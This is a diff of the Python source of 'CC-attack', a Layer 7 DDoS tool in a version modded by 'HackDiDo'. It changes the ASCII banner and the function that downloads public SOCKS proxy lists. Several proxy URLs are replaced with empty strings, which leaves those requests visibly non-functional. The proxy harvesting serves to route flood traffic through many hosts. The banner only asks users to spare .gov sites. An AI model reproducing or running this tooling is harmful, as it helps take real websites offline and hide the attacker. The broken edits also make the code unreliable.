@@ -17,18 +17,19 @@ os.system('color a')
 color = ['a', '8', 'c', '9', 'e', 'f']
 os.system('color %s' % (color[random.randrange(0, 5, 1)]))
 
-print ('''
-	   /////    /////    /////////////
-	  CCCCC/   CCCCC/   | CC-attack |/
-	 CC/      CC/       |-----------|/ 
-	 CC/      CC/       |  Layer 7  |/ 
-	 CC/////  CC/////   | ddos tool |/ 
-	  CCCCC/   CCCCC/   |___________|/
+print ('''\r\n
+██████╗ ██╗   ██╗███╗   ███╗███╗   ███╗███████╗██╗         
+██╔══██╗██║   ██║████╗ ████║████╗ ████║██╔════╝██║         
+██████╔╝██║   ██║██╔████╔██║██╔████╔██║█████╗  ██║         
+██╔═══╝ ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██║         
+██║     ╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗███████╗    
+╚═╝      ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ 
+
 >--------------------------------------------->
 Version 3.6.1 (2021/2/5)                        _________________
                                                I                 I
-					       I Mod by HackDiDo I
-					       I_________________I
+Layer 7                                        I Mod by HackDiDo I
+DDoS Tools				       I_________________I
 					        
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
@@ -40,7 +41,7 @@ Version 3.6.1 (2021/2/5)                        _________________
 ├─────────────────────────────────────────────┤
 │ Link: https://github.com/Leeon123/CC-attack │
 └─────────────────────────────────────────────┘
-''')
+\r\n''')
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -575,7 +576,7 @@ def downloadsocks(choice):
 	if choice == "4":
 		f = open("socks4.txt",'wb')
 		try:
-			r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=500&country=all&simplified=true",timeout=5)
+			r = requests.get("",timeout=5)
 			f.write(r.content)
 		except:
 			pass
@@ -654,7 +655,14 @@ def downloadsocks(choice):
 		try:
 			r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=500&country=all&simplified=true",timeout=5)
 			f.write(r.content)
+
 		except:
+			pass
+		try:
+			r = requests.get("",timeout=5)
+			f.write(r.content)
+                        
+		except: 
 			pass
 		try:
 			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
@@ -668,13 +676,13 @@ def downloadsocks(choice):
 		except:
 			pass
 		try:
-			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",timeout=5)
+			r = requests.get("",timeout=5)
 			f.write(r.content)
 			
 		except:
 			pass
 		try:
-			r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
+			r = requests.get("",timeout=5)
 			f.write(r.content)
 			f.close()
 		except:
